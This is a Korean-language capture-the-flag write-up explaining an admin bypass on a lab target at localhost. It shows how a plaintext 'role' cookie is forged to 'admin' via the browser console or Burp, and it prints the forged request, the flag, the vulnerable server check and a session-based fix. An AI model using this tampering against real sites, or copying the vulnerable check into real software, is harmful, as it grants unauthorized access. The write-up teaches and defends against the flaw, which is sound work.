+++
title = "VulnABLE CTF [LUXORA] Write-up: Admin Bypass 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Admin Bypass", "Bronze", "Cookie Manipulation", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Admin Bypass 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Access Control Layer (Admin Bypass)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/admin/bronze`
- **목표**: 사용자의 권한 등급을 서버가 아닌 클라이언트(브라우저)의 쿠키(Cookie) 값에 의존하는 취약점을 이용하여 관리자 대시보드에 접근하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 인증 플로우 분석 (Reconnaissance)

`/admin/bronze` 경로에 접속을 시도하면 "접근 권한이 없습니다. 일반 유저로 로그인하세요"라는 메시지가 나옵니다.
지정된 테스트 계정(`user` / `password123`)으로 로그인을 수행해 봅니다.

**[로그인 성공 후 발급된 쿠키 확인]**
브라우저의 F12(개발자 도구) -> Application -> Cookies를 확인합니다.

```http
Set-Cookie: role=guest; Path=/
Set-Cookie: session_id=xyz123; Path=/; HttpOnly
```

**[해커의 사고 과정]**
1. 쿠키에 `session_id` 뿐만 아니라 **`role=guest`** 라는 아주 직관적인 값이 세팅되어 있다.
2. 만약 내가 이 쿠키의 값을 브라우저에서 강제로 `role=admin` 으로 바꾼다면?
3. 서버가 세션 내부의 권한 정보를 DB에서 검증하지 않고, 단순히 이 쿠키 값만 믿어버린다면 나는 즉시 관리자가 될 수 있을 것이다.

---

## 💥 2. 취약점 식별 및 쿠키 변조 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Cookie: role=admin)--> [ Web Server ]
                                       |-- Check req.cookies.role
                                       |-- Grant Admin Access!
```


가장 고전적이고 단순한 권한 우회 기법인 **Cookie Manipulation (쿠키 조작)** 입니다.

### 💡 쿠키 조작 수행
브라우저 확장 프로그램인 `EditThisCookie`를 사용하거나, 개발자 도구의 콘솔에서 자바스크립트로 직접 쿠키를 덮어씁니다.

```javascript
// 브라우저 콘솔 창에 입력
document.cookie = "role=admin; path=/";
```

또는 Burp Suite의 Proxy를 켜두고, `/admin/bronze/dashboard` 로 향하는 GET 요청의 쿠키를 수정합니다.

**[조작된 요청 패킷]**
```http
GET /admin/bronze/dashboard HTTP/1.1
Host: localhost:3000
Cookie: role=admin; session_id=xyz123
```

---

## 🚀 3. 공격 수행 및 결과 확인

조작된 요청을 서버로 전송합니다.

### 🔍 서버의 응답
서버는 클라이언트가 직접 조작한 `role=admin` 쿠키를 아무 의심 없이 받아들이고 관리자 권한을 부여해 버립니다.

```html
HTTP/1.1 200 OK

<div class="admin-panel">
  <h1>System Administrator Dashboard</h1>
  <p>Welcome, Admin! Here are your system controls.</p>
  <p class="flag">FLAG{ADMIN_🥉_COOKIE_TAMPER_A1B2C3}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

권한(Authorization) 검증이라는 가장 중요한 보안 결정을 클라이언트(사용자)가 마음대로 수정할 수 있는 평문(Plaintext) 쿠키에 맡긴 로직 오류를 완벽히 파고들었습니다.

**🔥 획득한 플래그:**
`FLAG{ADMIN_🥉_COOKIE_TAMPER_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 문제는 OWASP Top 10의 **Broken Access Control** 중에서도 가장 초보적인 형태입니다. "클라이언트가 보내는 모든 데이터는 위변조가 가능하다(Zero Trust)"는 대원칙을 위반했습니다.

* **취약한 서버 로직**
```javascript
// 클라이언트가 보낸 쿠키 값을 100% 신뢰함
if (req.cookies.role === 'admin') {
    return renderAdminDashboard();
}
```

* **안전한 패치 가이드 (서버 중심의 권한 검증)**
사용자의 `role` 정보는 절대로 쿠키나 헤더 같은 클라이언트 측 저장소에 평문으로 남겨두어서는 안 됩니다.
권한 확인은 항상 **서버의 데이터베이스나 세션 객체**를 조회하여 수행해야 합니다.

```javascript
// 세션 ID만을 쿠키로 받고, 실제 권한은 서버에 저장된 세션 메모리에서 확인
if (req.session && req.session.role === 'admin') {
    return renderAdminDashboard();
} else {
    return res.status(403).send("Access Denied");
}
```
부득이하게 권한 정보를 클라이언트 쪽에 두어야 한다면, 반드시 암호학적 서명이 들어간 **JWT (JSON Web Token)**를 사용하고 서버에서 서명(Signature) 유효성을 엄격하게 검사해야 합니다.